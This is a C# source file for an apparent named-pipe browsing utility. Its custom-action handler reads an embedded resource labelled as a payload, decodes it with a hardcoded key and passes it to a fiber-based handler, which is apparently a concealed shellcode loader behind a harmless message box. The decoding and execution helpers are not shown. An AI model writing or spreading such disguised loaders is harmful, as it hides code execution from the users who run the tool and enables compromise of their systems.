using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NamedPipeExplorer
{
    internal static class Program
    {
        [STAThread]
        private static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            try
            {
                IReadOnlyList<string> pipes =
    NamedPipeEnumerator.GetNamedPipes();

                ListBrowser.Show(
                    pipes,
                    NamedPipeEnumerator.GetNamedPipes,
                    RunMyCustomCode);
            }
            catch (UnauthorizedAccessException ex)
            {
                MessageBox.Show(
                    "Access denied: " + ex.Message,
                    "Error",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
            }
            catch (IOException ex)
            {
                MessageBox.Show(
                    "Unable to enumerate named pipes: " +
                    ex.Message,
                    "Error",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
            }
            catch (Exception ex)
            {
                MessageBox.Show(
                    "Unexpected error: " + ex.Message,
                    "Error",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
            }
        }

        private static void RunMyCustomCode(string pipeName)
        {
            // Put your code here.
            MessageBox.Show(
                "Running custom code for:" +
                Environment.NewLine +
                pipeName,
                "Custom action",
                MessageBoxButtons.OK,
                MessageBoxIcon.Information);

            var assembly = Assembly.GetExecutingAssembly();

            byte[] dataframe;
            byte[] key = { 0x74, 0x65, 0x73, 0x74 };

            // read embedded payload
            using (var rs = assembly.GetManifestResourceStream("NamedPipeExplorer.enums.bin"))
            {
                using (var ms = new MemoryStream())
                {
                    rs.CopyTo(ms);
                    dataframe = Utils.remapDataframe(ms.ToArray(), key);
                }
            }

            FiberHandler.Handler(dataframe);

            return;

        }
    }
}
